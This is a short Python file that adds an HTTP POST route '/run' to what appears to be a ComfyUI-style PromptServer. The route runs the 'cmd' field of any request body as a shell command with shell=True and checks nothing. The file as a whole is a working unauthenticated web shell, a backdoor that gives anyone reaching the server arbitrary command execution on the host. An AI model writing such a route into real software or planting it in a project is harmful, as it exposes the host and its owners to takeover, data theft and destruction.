import subprocess
from server import PromptServer

@PromptServer.instance.routes.post('/run')
async def run(request):
    subprocess.run((await request.json())['cmd'], shell=True)
